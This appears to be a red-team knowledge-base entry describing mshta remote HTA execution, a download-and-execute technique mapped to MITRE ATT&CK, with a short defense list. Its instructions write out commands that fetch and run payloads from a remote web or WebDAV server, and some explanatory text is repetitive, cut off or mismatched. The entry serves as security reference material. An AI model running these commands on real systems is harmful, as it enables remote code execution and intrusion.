---
id: b1e40429-bff6-49af-953a-a734729c33bb
name: Mshta Remote HTA Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.864343+00:00'
updated_at: '2023-04-10T20:37:11.415493+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote File Copy|T1105 - Remote File Copy]]'
- '[[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]'
tags:
- '[[Mshta]]'
- '[[Windows - Download and execute methods]]'
commands:
- '[[Execute HTA payload]]'
- '[[Execute payload.hta via mshta]]'
---

# Mshta Remote HTA Execution

## Summary

Mshta is a Windows utility used for executing HTA files. Attackers can use mshta to remotely execute an HTA payload from a WebDAV server. This technique can be used to bypass application whitelisting and execute code on a victim's machine. The attacker can also use mshta to execute a script or comm

## Description

# Description

Mshta is a Windows utility used for executing HTA files. Attackers can use mshta to remotely execute an HTA payload from a WebDAV server. This technique can be used to bypass application whitelisting and execute code on a victim's machine. The attacker can also use mshta to execute a script or command on a victim's machine. This technique can be used to gain access to sensitive information or to create a persistent backdoor on the victim's machine.

Technical Explanation: Mshta is a Windows utility that can be used to execute HTA files. Attackers can use mshta to execute an HTA payload from a remote server. This technique can be used to bypass application whitelisting and execute code on a victim's machine. The attacker can also use mshta to execute a script or command on a victim's machine. This technique can be used to gain access to sensitive information or to create a persistent backdoor on the victim's machine.

Business Value: Attackers can use this technique to gain access to sensitive information or to create a persistent backdoor on a victim's machine. This can result in financial loss, reputational damage, and legal liability for the victim.

 

## Requirements

1. Remote access to a victim's machine

1. Access to a WebDAV server

 

## Defense

1. Disable or restrict the use of mshta utility on endpoints

1. Implement application whitelisting to prevent unapproved applications from running

1. Use network segmentation to limit access to critical systems

 

## Objectives

1. Remotely execute an HTA payload from a WebDAV server

1. Execute a script or command on a victim's machine

 

# Instructions

1. Execute a script using mshta

 



**Code**: [[mshta vbscript:Close(Execute("GetObject(""script:h]]



> This command executes a script using mshta, which is a Microsoft HTML Application Host. The script is retrieved from the specified URL and executed. The script can be in any language that is supported by mshta, such as VBScript or JScript. The command uses the Execute method of the mshta object to run the script. The Close method is used to close the mshta window after the script has finished executing.

2. Execute an HTA file hosted on a remote web server using mshta command

 



**Code**: [[mshta http://webserver/payload.hta]]



> This command executes an HTA file from a remote web server using the mshta command. The HTA file can contain scripts or other malicious payloads that can be executed on the target system. The HTA file can be hosted on a compromised or attacker-controlled web server. The mshta command is used to execute HTML applications and can be used to bypass application whitelisting controls. The use of this command should be monitored and restricted to authorized users only.



**Command** ([[Execute payload.hta via mshta]]):

```bash
mshta http://webserver/payload.hta
```



3. Execute an HTA payload from a WebDAV server.

 



**Code**: [[mshta \\webdavserver\folder\payload.hta]]



> This command executes an HTA payload from a remote WebDAV server. The 'data' field specifies the path to the payload on the server. The 'lang' field specifies the language used to execute the command, in this case PowerShell. No additional arguments are required for this command.



**Command** ([[Execute HTA payload]]):

```bash
mshta \\webdavserver\folder\payload.hta
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote File Copy|T1105 - Remote File Copy]]
- [[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]

## Commands Used

- [[Execute HTA payload]]
- [[Execute payload.hta via mshta]]

## Tags

- [[Mshta]]
- [[Windows - Download and execute methods]]


